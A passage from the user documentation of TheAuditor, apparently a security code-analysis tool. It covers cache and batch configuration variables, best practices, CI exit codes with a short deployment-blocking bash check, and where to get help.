# Batch processing
export THEAUDITOR_LIMITS_DEFAULT_BATCH_SIZE=500    # Default: 200

# Cache configuration (v1.2+)
export THEAUDITOR_TAINT_MEMORY_LIMIT=8589934592    # Default: 4GB (4294967296)
export THEAUDITOR_AST_CACHE_SIZE=10000             # Default: 10000 entries
export THEAUDITOR_CFG_CACHE_SIZE=25000             # Default: 25000 entries
export THEAUDITOR_GRAPH_CACHE_MAX_EDGES=100000     # Default: 100000 edges
export THEAUDITOR_AST_DISK_CACHE_SIZE=1073741824   # Default: 1GB
```

Configuration can also be set via `.pf/config.json` for project-specific overrides.

### Cache Architecture (v1.2+)

TheAuditor v1.2 introduces sophisticated caching for massive performance improvements:

**Memory Caches:**
- **Taint Analysis Cache**: In-memory multi-index structure with O(1) lookups
- **AST Parser Cache**: LRU cache for 10,000 parsed files (was 500 in v1.1)
- **CFG Analysis Cache**: SQLite cache for 25,000 functions (was 10,000 in v1.1)

**Disk Caches:**
- **Graph Cache**: SQLite with 100,000 edge limit and LRU eviction
- **AST Disk Cache**: JSON files with 1GB/20,000 file limits

These caches enable:
- **8,461x faster** taint analysis on warm runs
- **Near-instant** re-analysis of unchanged code
- **Memory safety** through smart eviction policies

---

## Best Practices

1. **Always run `aud init` first** in a new project
2. **Set up the sandbox** for JavaScript/TypeScript projects using **`aud setup-ai --target .`**
3. **Use worksets** for incremental analysis during development
4. **Run `aud full`** before releases for comprehensive analysis
5. **Review `.pf/readthis/`** for AI-friendly issue summaries
6. **Check exit codes** in CI/CD for automated pass/fail decisions
7. **Archive results** with timestamps for audit trails

---

## Exit Codes for Automation

**TheAuditor** uses specific exit codes for CI/CD integration:

- **`0`** - Success, no critical/high issues
- **`1`** - High severity findings
- **`2`** - Critical severity findings  
- **`3`** - Pipeline/task incomplete

Use these in scripts:
```bash
aud full
if [ $? -eq 2 ]; then
    echo "Critical vulnerabilities found - blocking deployment"
    exit 1
fi
```

---

## Getting Help

- Run **`aud --help`** for command overview
- Run **`aud <command> --help`** for specific command help
- Check **`.pf/pipeline.log`** for execution details
- Review **`.pf/error.log`** for troubleshooting
- Refer to **`teamsop.md`** for development workflow

---

## Next Steps

1. Initialize your first project with **`aud init`**
2. Run **`aud full`** to see TheAuditor in action
3. Explore the results in **`.pf/readthis/`**
4. Integrate into your CI/CD pipeline
5. Customize patterns for your specific needs

---

**Remember**: TheAuditor is designed to work **offline**, maintain **data integrity**, and produce **AI-ready outputs**. All analysis is **deterministic** and **reproducible**.
